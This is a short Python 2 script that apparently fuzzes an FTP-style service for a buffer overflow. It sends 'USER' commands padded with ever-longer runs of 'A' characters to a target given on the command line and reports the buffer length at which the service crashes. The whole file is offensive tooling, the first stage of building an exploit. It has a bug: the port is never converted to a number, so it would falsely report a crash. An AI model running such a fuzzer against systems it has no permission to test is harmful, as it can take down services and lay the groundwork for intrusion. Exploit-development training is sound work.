import sys, socket
from time import sleep
target = sys.argv[1]
port = sys.argv[2]
buff = '\x41'*50
while True:
  try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((target,port))
    s.recv(1024)
    print "Sending buffer with length: "+str(len(buff))
    s.send("USER "+buff+"\r\n")
    s.close()
    sleep(1)
    buff = buff + '\x41'*50
  except:
    print "[+] Crash occured with buffer length: "+str(len(buff)-50)
    sys.exit()